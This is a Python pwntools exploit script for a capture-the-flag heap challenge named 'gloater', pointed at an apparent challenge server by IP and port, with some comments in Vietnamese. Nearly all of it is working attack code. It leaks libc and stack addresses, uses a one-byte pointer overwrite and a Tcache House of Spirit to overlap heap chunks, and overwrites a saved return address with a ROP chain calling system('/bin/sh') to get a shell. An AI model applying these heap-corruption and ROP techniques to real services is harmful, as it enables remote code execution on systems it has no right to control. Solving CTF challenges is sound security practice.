#!/usr/bin/env python3

from pwn import *

# use "-l 500" with splitmind
context.terminal = ["tmux", "splitw", "-h", "-l 500"]

exe = ELF("challenge/gloater_patched")
libc = ELF("challenge/libc-2.31.so")
ld = ELF("./challenge/ld-2.31.so")
context.binary = exe

host = "94.237.56.118"
port = 37820

# host = "localhost"
# port = 9001

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# shortcut lambda
info = lambda msg: log.info(msg)
success = lambda msg: log.success(msg)
sla = lambda msg, data: io.sendlineafter(msg, data)
sa = lambda msg, data: io.sendafter(msg, data)
sl = lambda data: io.sendline(data)
s = lambda data: io.send(data)
# --- end ---

menu_choice = b"> "

# functions
def CHANGE_USER(new_user: bytes):
    sla(menu_choice, b"1")
    sa(b"New User: ", new_user)

def CREATE(target: bytes, content: bytes = b""):
    sla(menu_choice, b"2")
    sa(b"Taunt target: ", target)
    if content:
        sla(b"Taunt: ", content)
        
def REMOVE(idx: int):
    sla(menu_choice, b"3")
    sla(b"Index: ", str(idx).encode())

def SEND():
    sla(menu_choice, b"4")
    
def SET_SUPER_TAUNT(idx:int, plague: bytes):
    sla(menu_choice, b"5")
    sla(b"Index for Super Taunt: ", str(idx).encode())
    sa(b"Plague to accompany the super taunt: ", plague)
# --- end functions ---

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
breakrva 0x0130E
breakrva 0x164B 
c
'''.format(**locals())
# bp change_user+0
# bp create_taunt+0
# bp set_super_taunt+0
io = start()

# --- good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :)good luck pwning :) ---

# setup name length to leak stack address
sa(menu_choice, b"s"*0x10)

# 1. leak libc
CREATE(b"test", b"a"*0x20)                                      # 0
SET_SUPER_TAUNT(0, b"l"*136)

io.recvuntil(b"l"*136)
leaked_puts = u64(io.recv(6).ljust(8, b"\x00"))
libc.address = leaked_puts - libc.sym['puts']
success(f"done 1. libc.address: {hex(libc.address)}")
# --- done 1. leak libc ---

# 2. setup overlapped chunk by Tcache House of Spirit
CREATE(b"garbage", b"garbage")                                  # 1: địa chỉ taunt sang đầu 0x*****3**

fake_tcache = flat(
    0, 0x31,                # prev_size | size
    b"n"*8, b"k"*8,         # next | key
    0,                      # fake taunt->ptr_another = null => free (fake taunt=>ptr_another) don't crash    
)

CREATE(b"garbage", fake_tcache)                                 # 2: target contains fake tcache

overwrite_1_byte = b"a"*12 + b"\x90"                            # địa chỉ fake chunk có dạng 0x*****390
CHANGE_USER(overwrite_1_byte)                                   # vừa ghi đè ptr, vừa leak stack
io.recvuntil(b"s"*0x10)                                         
leaked_stack = u64(io.recv(6).ljust(8, b"\x00"))                
success(f"done 2.1 leaked stack: {hex(leaked_stack)}")

CREATE(b"garbage", b"a"*0x20)                                   # 3: increase tcache count
REMOVE(3),                                                      # increase tcache count

REMOVE(1)                                                       # free overwrited taunts[1] (now is fake tcache chunk)
REMOVE(2)                                                       # free taunts[2] overlapped with fake tcache chunk
# --- done 2. Tcache House of Spirit ---

# 3. calculate the stack address contains return address of function create_taunt
debug_saved_rip = 0x7fffffffdef8
debug_leaked_stack = 0x7fffffffdf10
real_saved_rip = leaked_stack - (debug_leaked_stack - debug_saved_rip)
info(f"done 3. real saved_rip: {hex(real_saved_rip)}")
# --- done 3. ---

# final. exploit overlapped chunk to overwrite tcache->next => Malloc-Where primitive
where_you_want_to_write = p64(real_saved_rip)

payload = (b"a"*0x10 + where_you_want_to_write).ljust(0x30, b'a')   # fake_tcache->next = where_you_want_to_write
CREATE(b"garbage", payload)

roplibc = ROP(libc)
poprdi = roplibc.find_gadget(['pop rdi', 'ret'])[0]
ret = roplibc.find_gadget(['ret'])[0]

payload = flat(
    poprdi,
    next(libc.search(b"/bin/sh\x00")),
    ret,
    libc.sym['system'],    
).ljust(0x20, b'a')

CREATE(b"garbage", payload)

io.interactive()

